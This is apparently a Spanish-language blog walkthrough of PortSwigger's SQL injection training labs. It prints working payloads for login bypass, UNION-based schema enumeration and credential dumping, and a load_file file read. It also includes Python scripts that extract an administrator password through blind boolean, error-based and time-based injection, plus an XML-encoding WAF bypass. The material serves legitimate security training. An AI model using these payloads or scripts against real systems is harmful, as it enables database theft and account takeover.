---
layout: single
title: SQL Injection - PortSwigger
excerpt: "En este post vamos a estar resolviendo los diferentes laboratorios de la plataforma de Portswigger para practicar y reforzar conocimientos sobre las inyecciones sql serán varios laboratorios con diferentes casos cada uno algunos son fáciles y otros se van a poner un poco mas complicados en caso de que te pierdas o no puedas resolverlo tienes mas información sobre el laboratorio en donde accedes a el"
date: 2023-05-25
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/ports-writeup-sqli/logo.png
  teaser_home_page: true
  icon: /assets/images/portswigger.webp
categories:
  - PortSwigger
  - infosec
tags:  
  - SQL Injection
  - Python Scripting
---

⮕ SQL Injections Lab (Puedes dar click en cualquier tipo de inyeccion que esta en el contenido para ir directamente a esa)

>Las inyecciones SQL se producen cuando los atacantes insertan código SQL malicioso en los campos de entrada de una aplicación web. Si la aplicación no valida adecuadamente la entrada del usuario, la consulta SQL maliciosa se ejecutará en la base de datos, lo que permitirá al atacante obtener información confidencial o incluso controlar la base de datos.

<https://portswigger.net/web-security/sql-injection/cheat-sheet>

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

Lo primero que debes de hacer es ir ala pagina web y cuenta puedes hacer esto [aqui](https://portswigger.net/) **Es mejor hacerlo desde un navegador google chrome**

Una vez creaste tu cuenta iremos al primer caso <https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data> y pues accedes en el lab 

Vemos una tienda 

![](/assets/images/ports-writeup-sqli/web1.png)

en la descripción del laboratorio nos dicen que cuando elegimos una categoría esta es la `query` que pasa por detrás **Lo que esta haciendo es mostrarte todo de la categoria que elegiste donde products es la tabla y category es la columna**

```bash
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Lo que nos están pidiendo es que realicemos una inyección **SQLI** que lo haga es mostrar mas detalles de los productos publicas y no publicados en cualquier categoría 

Si seleccionamos `Pets` la `url` queda de esta manera

![](/assets/images/ports-writeup-sqli/web2.png)

Si ponemos `' or 1=1-- -` lo que va hacer es que con la `'` cerramos la categoría y el `or 1=1-- -` lo que hace es que como le estas diciendo `1=1` lo cual es correcto y es **TRUE** te lo va tomar como valido y el `-- -` es para comentar el resto de la `query` para que no interpreta lo que esta alado en esta caso lo que no se va a interpretar es `AND released = 1` si ponemos esa `query` saldrán productos que no estaban y con eso completamos el lab 

![](/assets/images/ports-writeup-sqli/web3.png)

## SQL injection vulnerability allowing login bypass 

<https://portswigger.net/web-security/sql-injection/lab-login-bypass>

Ahora en este laboratorio nos piden hacer una `SQLI` a un panel de login donde nos conectemos como el usuario **administrador** sin proporcionar contraseña 

Este es el panel de login

![](/assets/images/ports-writeup-sqli/web4.png)

Si analizamos lo que nos piden por detrás lo mas seguro es que se esta aplicando una `query` como esta  

```bash
select name,lastname from users where username = 'administrator' and password = 'password'
```

El campo `Username` pues es el usuario y el campo `Password` pues va la contraseña en los 2 campos podemos escribir pero bueno nos piden conectarnos como el usuario `Administrator` pero no sabemos su contraseña así que lo que podemos hacer es que el **input** del **Username** poner `Administrator'-- -` lo que estaremos haciendo es que no aplica la comparativa que esta haciendo para la contraseña estamos comentando esa parte en la contraseña puedes poner cualquier cosa pero no la va a tomar en cuenta por que estas comentando el resto de la query

![](/assets/images/ports-writeup-sqli/web5.png)

Si le damos en `Log in` funciona y terminamos el lab 

![](/assets/images/ports-writeup-sqli/web6.png)

## SQL injection UNION attack, determining the number of columns returned by the query 

<https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns>

Ahora lo que nos piden es determinar el numero de columnas que existen en las inyecciones pues tenemos: **bases de datos, tablas, columnas y datos** al igual nos dicen que la parte de la categoría es donde se acontece la vulnerabilidad  

Esta es la web 

![](/assets/images/ports-writeup-sqli/web7.png)

Vamos a filtrar por alguna categoría y ya vemos que nos esta mostrando cosas relacionas a eso 

![](/assets/images/ports-writeup-sqli/web8.png)

Si hacemos un `'order by 100-- -` que bueno esto es para aplicar un ordenamiento basándonos en la 100 columna que pues obviamente nos existe y nos da un error

`Gifts' order by 100-- -`

![](/assets/images/ports-writeup-sqli/web9.png)

Lo que podemos hacer es que cuando no nos ponga error pues seria correcta si rebajos a 3 ya no nos da error `' order by 3-- -` por que es correcto

![](/assets/images/ports-writeup-sqli/web10.png)

Ahora sabiendo el numero total de columnas podemos usar un `Union select` para combinar datos

Seria algo así la query `' union select NULL,NULL,NULL-- -` en este caso tenemos que poner `NULL` por que en la web no admite numeros pero lo que casi siempre se pone es por ejemplo si son 3 pues `'union select 1,2,3-- -` casi siempre el atacante se aprovecha de esto para por ejemplo en el 1 que mejor nos diga cual es la base de datos actualmente en uso haciendo esto `'union select database(),2,3-- -` , ademas tambien puedes saber quien esta corriendo la base de datos, cargar archivos de la maquina con     `'union select load_file("/etc/hosts"),2,3-- -` esto depende si tienes capacidad de lectura si no pues no podrás cargar el archivo y muchas mas vamos a resolver el lab con este que ahora ya sabemos 

![](/assets/images/ports-writeup-sqli/web11.png)

Y funciona 

![](/assets/images/ports-writeup-sqli/web12.png)

## SQL injection UNION attack, finding a column containing text 

<https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text>

Ahora lo que nos piden es que atraves de nuestra **query** la base de datos nos devuelva la cadena que nos dan (la tuya pueda ser diferente) 

![](/assets/images/ports-writeup-sqli/web13.png)

Vamos irnos a una categoría para seleccionarla ademas sabemos que hay 3 columnas asi que es igual `' union select NULL,NULL,NULL-- -` 

![](/assets/images/ports-writeup-sqli/web14.png)

Bueno de primeras no sabemos cual campo es inyectable si el 1,2 o 3 así que lo que tenemos que hacer es ir probando para ver en cual si nos interpreta la cadena vamos a probar el primer campo y no `' union select 'v3jsC6',NULL,NULL-- -`

![](/assets/images/ports-writeup-sqli/web15.png)

![](/assets/images/ports-writeup-sqli/web16.png)

Si lo probamos en la segunda si funciona y con esto ya terminamos el laboratorio `' union select NULL,'v3jsC6',NULL-- -`

![](/assets/images/ports-writeup-sqli/web17.png)

## SQL injection UNION attack, retrieving data from other tables

<https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables>

Ahora nos piden primero es que nos conectemos como el usuario **Administrador** pero antes tenemos que averiguar cual es la contraseña del usuario **administrador** aplicando un inyección **sql**

Vamos a seleccionar otra vez otra categoría 

![](/assets/images/ports-writeup-sqli/web18.png)

Ahora primeramente necesitamos saber cuantas columnas hay ya les adelanto que hay 2 por que si analizas la web abajo te esta mostrando un titulo y una descripción 

![](/assets/images/ports-writeup-sqli/web19.png)

Ya vemos que funciona ahora siguiente el concepto necesitamos saber cual es el campo inyectable

![](/assets/images/ports-writeup-sqli/web20.png)

Si probamos con el primer campo inyectando una string vemos que si funciona ` 'union select 'xd',NULL-- -` 

![](/assets/images/ports-writeup-sqli/web21.png)

Ahora vamos a inyectar una query para saber las bases de datos que existen `' union select schema_name,NULL from information_schema.schemata-- -` y nos esta mostrando Bases de datos

![](/assets/images/ports-writeup-sqli/web22.png)

Ya conocemos las bases de datos ahora tenemos que enumerar las tablas si haces esto `' union select table_name,NULL from information_schema.tables-- -` si haces esto te va a mostrar todas las tablas de todas las bases de datos tal vez suena interesante pero no es la idea por que solo queremos saber la contraseña del usuario **administrator**

![](/assets/images/ports-writeup-sqli/web23.png)

Podemos indicarle de cual base de datos queremos saber las tablas de la base de datos `public` con la siguiente **query** `' union select NULL,table_name from information_schema.tables where table_schema='public'-- -` 

![](/assets/images/ports-writeup-sqli/web24.png)

La tabla **users** esta interesante lo mas probable es que hay estén las columnas usernames y password 

Ahora vamos a dumpear las columnas para la tabla **users** y para la base de datos **public** esta seria la query `' union select column_name,NULL from information_schema.columns where table_schema ='public' and table_name='users'-- - ` 

Si aplicamos la `query` vemos las columnas existentes

![](/assets/images/ports-writeup-sqli/web25.png)

Después de probar varias querys esta fue la única que me funciono `' union select NULL,username||':'||password from users-- -`

![](/assets/images/ports-writeup-sqli/web26.png)

Ahora si nos a la sección de **My account** vemos que las credenciales son correctas y podemos conectarnos

![](/assets/images/ports-writeup-sqli/web27.png)

## SQL injection UNION attack, retrieving multiple values in a single column 

Ahora nos piden representar múltiples campos en una sola columna lo mismo de antes para conectarnos como el administrador 

<https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column>

Ahora lo que vamos a hacer es seleccionar otra categoría y ya podemos ver que van a ser solo 2 columnas 

![](/assets/images/ports-writeup-sqli/web28.png)

Vamos a hacer lo mismo para saber cuales son las bases de datos

![](/assets/images/ports-writeup-sqli/web29.png)

Ahora vamos a enumerar las tablas

![](/assets/images/ports-writeup-sqli/web30.png)

Ahora vamos a enumerar las columnas

![](/assets/images/ports-writeup-sqli/web31.png)

Vamos aplicar un **concat** para ver la data 

![](/assets/images/ports-writeup-sqli/web32.png)

Ahora nos vamos a conectar y las credenciales son validas

![](/assets/images/ports-writeup-sqli/web33.png)

## SQL injection attack, querying the database type and version on Oracle

<https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle>

Ahora la cosa cambia por que la base de datos es de `Oracle` y nos piden averiguar la versión y el tipo de base de datos que esta empleando 

Si nos abrimos el laboratorio vemos que nos dice que hagamos que nos devuelva toda esa string

![](/assets/images/ports-writeup-sqli/web34.png)

Vamos a seleccionar una categoría y como es lo mismo que en las anteriores pues son 2 columnas pero me da error aunque haga `' union select NULL,NULL-- -`

![](/assets/images/ports-writeup-sqli/web35.png)

Pero bueno nos da el error por que se esta empleando **Oracle** y en **Oracle** tenemos que siempre indicar una tabla bueno esta es la tabla que es mejor 

![](/assets/images/ports-writeup-sqli/web36.png)

Si ahora le indicamos al tabla `dual` ya nos va a dar error `' union select NULL,NULL from dual-- -`

![](/assets/images/ports-writeup-sqli/web37.png)

Si nos vamos al **cheet sheet** que puse al principio nos dan información de como hacerlo para **Oracle**

![](/assets/images/ports-writeup-sqli/web38.png)

Vamos a emplear la siguiente **query** por que ya sabemos como hacerlo `' union select NULL,banner from v$version-- -` y funciona

![](/assets/images/ports-writeup-sqli/web39.png)

## SQL injection attack, querying the database type and version on MySQL and Microsoft

<https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft>

Ahora nos piden lo mismo pero para **Microsoft** 

![](/assets/images/ports-writeup-sqli/web40.png)

Basándonos en el **cheet sheet** pues rápido podemos ver la versión con la siguiente **query** `' union select NULL,@@version-- -`

![](/assets/images/ports-writeup-sqli/web41.png)

## SQL injection attack, listing the database contents on non-Oracle databases

<https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle>

Ahora nos piden obtener la contraseña del usuario **administrator**

Vamos a elegir una categoría y como sabemos que son 2 columnas **NULL,NULL** pues vamos a enumerar las bases de datos directamente

![](/assets/images/ports-writeup-sqli/web42.png)

Vamos a enumerar las tablas para la base de datos **public**

![](/assets/images/ports-writeup-sqli/web43.png)

Ahora las columnas

![](/assets/images/ports-writeup-sqli/web44.png)

Y con esto tenemos las contraseñas 

![](/assets/images/ports-writeup-sqli/web45.png)

Vamos validar que son correctas y terminamos el laboratorio 

![](/assets/images/ports-writeup-sqli/web46.png)

## SQL injection attack, listing the database contents on Oracle 

<https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle>

Ahora tenemos que hacer lo mismo pero para **Oracle** 

Vamos a seleccionar una categoría y bueno ya sabemos que hay 2 columnas pero tenemos que usar **dual** por que se esta empleando **Oracle**

![](/assets/images/ports-writeup-sqli/web47.png)

Ahora vamos seguir dumpeando pero hay que recordar que se esta usando **Oracle**

Bueno en **Oracle** podemos ver propietarios de las bases de datos `' union select NULL,owner from all_tables-- -`

![](/assets/images/ports-writeup-sqli/web48.png)

Podemos ver las tablas donde el propietario sea **PETER** 

`' union select NULL,table_name from all_tables where owner = 'PETER'-- -`

![](/assets/images/ports-writeup-sqli/web49.png)

Ahora vamos a dumpear las columnas `' union select NULL,column_name from all_tab_columns where table_name = 'USERS_YUXJGI'-- -`

![](/assets/images/ports-writeup-sqli/web50.png)

Con la siguiente query vamos ver las credenciales `' union select NULL,USERNAME_YRXBVR||':'||PASSWORD_QLAFCK from USERS_YUXJGI-- -`

![](/assets/images/ports-writeup-sqli/web51.png)

Ahora si nos conectamos pues terminas el laboratorio y bueno a por el siguiente

## Blind SQL injection with conditional responses

Esta inyección es basada en la respuesta y bueno tenemos la misma web así que vamos a volver a elegir una categoría

Si ponemos una **'** vemos que desaparecen las cosas

![](/assets/images/ports-writeup-sqli/web52.png)

Si ponemos varias querys pues no va a pasar nada pero si leemos bien lo que tenemos que hacer nos dice que que el campo inyectable no es el de la categoría es en la `cookie` es por eso que si pruebas cosas no te va a mostrar nada **vamos a usar Burpsuite** para capturar la petición simplemente recarga y listo 

![](/assets/images/ports-writeup-sqli/web56.png)

Bueno si leemos nos dicen que el **Welcome Back** el mensaje que nos aparecía para ciertas peticiones puede desaparecer así que eso ya lo podemos poner como pista

Si ponemos una **'** en la parte inyectable desaparece el mensaje

![](/assets/images/ports-writeup-sqli/web57.png)

Si comentas el resto de la query nos pone el mensaje

![](/assets/images/ports-writeup-sqli/web58.png)

Lo que vamos a hacer es aprovecharnos del mensaje si probamos con un 2=1-- - que es falso nos quita el mensaje

![](/assets/images/ports-writeup-sqli/web59.png)

Bueno lo que podemos hacer es meter una nueva **query** sabemos que la tabla **users** existe entonces podemos jugar con **substring** aprovechándonos de la tabla **users** del usuario **administrator**

![](/assets/images/ports-writeup-sqli/web60.png)

Bueno como es un **conditional error** si por ejemplo ponemos la letra **b** a no igual a **b** entonces no nos muestra el mensaje podemos basarnos en eso para saber cuando el carácter es valido o no

![](/assets/images/ports-writeup-sqli/web61.png)

Si por ejemplo seleccionamos el segundo caracter **username,2,1** la palabra **admnistrator** su segunda letra es la **d** así que ya es correcto y nos aparece en el mensaje para basarnos en eso 

![](/assets/images/ports-writeup-sqli/web62.png)

Igual que el campo **Username** podemos hacerlo para **password** pero vamos a usar **Python3** para que sea mucho mas rápido y poder fuzzear las posiciones y nos basamos en la respuesta

```bash
#!/usr/bin/python3 

from pwn import *
import requests, time, signal, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+c 
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0aa6009704c7d45a88ea00aa00d1002d.web-security-academy.net/"
characters = string.ascii_lowercase + string.digits

def makeRequest():
    
    password = ""

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando Fuerza Bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21): # Longitud de la contraseña 
        for character in characters:    
            
            cookies = {
                'TrackingId': "h9NyMIr3HYJLUkb8' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),
                'session': 'yTTLOIU9sVTCPIJ9RRzXZF1jIoSmaWuN'
            }

            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if "Welcome back!" in r.text:
                password += character
                p2.status(password)
                break
if __name__ == '__main__':
    makeRequest()

```

```bash
❯ python3 SQLI_ce.py
[◤] Fuerza Bruta: h9NyMIr3HYJLUkb8' and (select substring(password,20,1) from users where username='administrator')='r
[▅] Password: 9ukm2pkd8yzk570rqv2r
```

![](/assets/images/ports-writeup-sqli/web63.png)

## Blind SQL injection with conditional errors

<https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors>

Para esta inyeccion no vas a ver errores en la respuesta si nos vamos a ver códigos de estado y en eso nos vamos a basar y bueno es otro vez atreves de la cookie asi que vamos a seleccionar una categoría y de hay pues vamos a interceptar la petición con **Burpsuite** y bueno ahora no vemos nada del welcome back!

![](/assets/images/ports-writeup-sqli/web64.png)

Si en el **Tracking Id** podemos una camilla nos sale un error con el código 500 así que pues bueno va a ser lo mismo pero ahora basándonos en el error pero bueno si es que cambian algunas cosas pero en el siguiente script de **Python3** la inyeccion quedaria lista 

```bash
#!/usr/bin/python3 

from pwn import *
import requests, time, signal, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+c 
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a77003e03026052829c9d1f00cf006c.web-security-academy.net/"
characters = string.ascii_lowercase + string.digits

def makeRequest():
    
    password = ""

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando Fuerza Bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21): # Longitud de la contraseña 
        for character in characters:    
            
            cookies = {
                'TrackingId': "TrackingId=RYv84rwBNkKgrR6I'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position, character),
                'session': 'uMuOQ5tR8SukkqghM9kJijQdjAhx55n6'
            }

            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if r.status_code == 500: # Codigo de estado
                password += character
                p2.status(password)
                break
if __name__ == '__main__':
    makeRequest()

```

```bash
❯ python3 error.py
[o] Fuerza Bruta: TrackingId=RYv84rwBNkKgrR6I'||(select case when substr(password,20,1)='u' then to_char(1/0) else '' end from users where username='administrator')||'
[▇] Password: dq661c6kbqr9wemn3khu
```

![](/assets/images/ports-writeup-sqli/web65.png)

## SQL injection with time delays

<https://portswigger.net/web-security/sql-injection/blind/lab-time-delays>

Esta inyección es basada en tiempo y la base de datos es de **Postgress** asi que nos vamos a capturar la petición con burpsuite otra vez

El campo inyectable también es el mismo campo pero bueno esta es una inyección basada en tiempo para ver si esto es vulnerable a la de tiempo podemos hacer un `pg_sleep(10)-- -` y si la web tarda 10 segundos en responder es por que es vulnerable

lo único que tienes que hacer para resolver el laboratorio lo único que tienes que hacer es esto 

![](/assets/images/ports-writeup-sqli/web66.png)

![](/assets/images/ports-writeup-sqli/web67.png)

## Blind SQL injection with time delays and information retrieval 

<https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval>

Ahora nos vamos aprovechar del tiempo para poder dumpear datos 

Bueno para dumpear datos es igual que el script de python3 pero ahora tenemos que usar el tiempo asta ahora sabemos que la tabla se users y el usuario se llama administrator 

```bash
#!/usr/bin/python3 

from pwn import *
import requests, time, signal, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+c 
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0ae40016039741e7814a1bbe003600ff.web-security-academy.net"
characters = string.ascii_lowercase + string.digits

def makeRequest():
    
    password = ""

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando Fuerza Bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21): # Longitud de la contraseña 
        for character in characters:    
            
            cookies = {
                'TrackingId': "1lFKg9knAZv6c4Rh'||(select case when substring(password,%d,1)='%s' then pg_sleep(1.5) else pg_sleep(0) end from users where username='administrator')-- -" % (position, character),
                'session': 'GFWmEskRVbNs1roHXayzNqy3kmOWofMd'
            }
            
            p1.status(cookies['TrackingId'])

            time_start = time.time()

            r = requests.get(main_url, cookies=cookies)
            
            time_end = time.time()

            if time_end - time_start > 1.5:
                password += character
                p2.status(password)
                break
if __name__ == '__main__':
    makeRequest()

```

```bash
❯ python3 SQLI_b.py
[▇] Fuerza Bruta: 1lFKg9knAZv6c4Rh'||(select case when substring(password,20,1)='6' then pg_sleep(1.5) else pg_sleep(0) end from users where username='administrator')-- -
[.......\] Password: m2at1sufe07hhx5v5vv6
```

## SQL injection with filter bypass via XML encoding

<https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding>

Ahora nos dicen que hay una vulnerabilidad en el **stock check feature.** 

![](/assets/images/ports-writeup-sqli/web68.png)

Vamos a capturar la petición con **Burpsuite** al hacer click en **Check Store**

Y vemos que hay una estructura en **XML** de primeras pues pensamos en un **XXE** pero bueno vamos a probar con las inyecciones

![](/assets/images/ports-writeup-sqli/web69.png)

Y bueno ya nos detectan hay un **WAF**

![](/assets/images/ports-writeup-sqli/web70.png)

Bueno en el laboratorio nos dicen que usemos **hackvertor** que tenemos que instalarlo en **Burpsuite** puedes hacerlo de esta forma

![](/assets/images/ports-writeup-sqli/web71.png)

Una vez instalado solo tienes que seleccionar la query **Click derecho + Entensions y Harkvertor + Enconde + hex_entities** (tube volver a poner el laboratorio tuve unos errores con la conexión pero básicamente es lo mismo solo seleccione otro producto)

![](/assets/images/ports-writeup-sqli/web72.png)

Vamos a dumpear las bases de datos

![](/assets/images/ports-writeup-sqli/web73.png)

Vamos a ver directamente la contraseña del **administrator**

![](/assets/images/ports-writeup-sqli/web74.png)

![](/assets/images/ports-writeup-sqli/final.png)



